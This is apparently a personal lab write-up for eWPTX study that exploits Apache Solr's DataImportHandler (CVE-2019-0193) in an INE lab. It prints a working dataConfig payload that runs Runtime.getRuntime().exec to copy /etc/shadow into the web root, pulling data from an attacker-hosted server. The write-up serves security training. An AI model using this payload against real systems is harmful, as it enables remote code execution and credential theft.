2026-02-04 20:43

Status:

Tags: [[eWPTX]] [[XML]]
###### Prerequisites: [[XML External Entities (XXE)]]
# XXE - Lab (Apache Solr)

## Summary

- Target: `http://<TARGET_IP>:8983/solr`
- Product: Apache Solr (lab)
- Finding: `CVE-2019-0193` (DataImportHandler RCE path used by the lab)
- Proof: `poc.txt` accessible under `/solr/` after execution (lab)

> Replace `<TARGET_IP>` / `<ATTACKER_IP>` with your lab values.

---

## Task 1: Port Scanning & Enumeration

### Step 1: Identify the target IP

**Command:**

```
ip addr
```

![[Pics/INE/131a9c628152c2aabe083c727033a0d840d627e0a6ddc047845741f4fc03e7e2_731eeaa4e8.png]]

Result:

- Web app is running on port `8983`
- Target IP in my run: `192.55.34.3` (your lab will differ)

## Task 2: Exploiting The Vulnerability

### Step 2: Inspect the web application

![[Pics/INE/0499169e16dc18764be90a6fbf9edcfed65b47e02787df275d549cbb6e30750e_24fae39bf9.png]]

### Step 3: Research the Solr version / known issues (lab)

![[Pics/INE/0b6f2ddd2acc93fb7b247e54a8ea6013b798a494a393b919830b38dbc45a9924_cbc1d4a424.png]]

Notes:

- The GitHub link contains procedures used by the lab.

GitHub link: `https://github.com/veracode-research/solr-injection#3-cve-2019-0193-remote-code-execution-via-dataimporthandler`

![[Pics/INE/e4203e0eb2c0c520b9ba961590ba4a4e5290be27339ea8e19099457991b35d60_eca3b42a84.png]]

### Step 4: Host a simple XML file (lab requirement)

```
<?xml version="1.0" encoding="utf-8"?>
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<body>Don't forget me this weekend!</body>
</note>
```

![[Pics/INE/ecf93bd9558f655f5a33d5edc68942b2bd55d3ea636e2068da25fea855def325_59ff8dc19f.png]]

### Step 5: Start a local server on port 80

Command:

```
php -S 0.0.0.0:80
```

![[Pics/INE/e76ce5b3a991f0593ebd955f9bd6c0c3c3092f167bc09c0c2ebf63e82d262a21_fc22843d6d.png]]

### Step 6: Select the `db` core

![[Pics/INE/5256b2400db4f869da7d705e00948488fe146d1283ae61fedcb360ebbeb09fd9_ce13846e5d.png]]

### Step 7: Open `DataImport`

![[Pics/INE/6e0f464bb4765b432facaef0fec43ba09f24b35e73e5ce41a00f93d12b220f0a_7f22926181.png]]

### Step 8: Enable debug mode and paste the lab configuration

Configuration used in the lab:

```
<dataConfig>
    <dataSource type="URLDataSource"/>
    <script><![CDATA[
        function poc(){ java.lang.<Insert payload snippet here>().exec("cp /etc/shadow /opt/solr/server/solr-webapp/webapp/poc.txt");
}
]]></script>
<document>
    <entity name="stackoverflow"
        url="http://<ATTACKER_IP>/solr"
        processor="XPathEntityProcessor"
        forEach="/note"
        transformer="script:poc" />
</document>
</dataConfig>

Note: Replace the missing payload snippet above with this Runtime.getRuntime
```

This poc function will try to copy the shadow file to web root directory.

![[Pics/INE/48c69e3bf5f67d0265d670b26771fbc3fd4db65dab287a1e42795c6f7d251353_c1a4922dff.png]]

### Step 9: Execute with this configuration

![[Pics/INE/633a0503b702aaac913cd1b82869fc0238c2b29e5dc9c02dc40d74d226949a33_2758102e2d.png]]

The xml file has been indexed as well as the exploit worked too.

### Step 10: Verify output (`/solr/poc.txt`)

![[Pics/INE/f37f44fc44463398b607e469c8cac04580d22621e7ac15f4f9ac8cb79ae56f13_665e0aaee5.png]]

The shadow file has been copied to webroot directory.

---

## References

1. Apache Solr (​https://lucene.apache.org/solr/​)
2. CVE-2019-0193 (​https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0193​)
3. Apache Solr DataImport Handler RCE (​https://github.com/jas502n/CVE-2019-0193​)
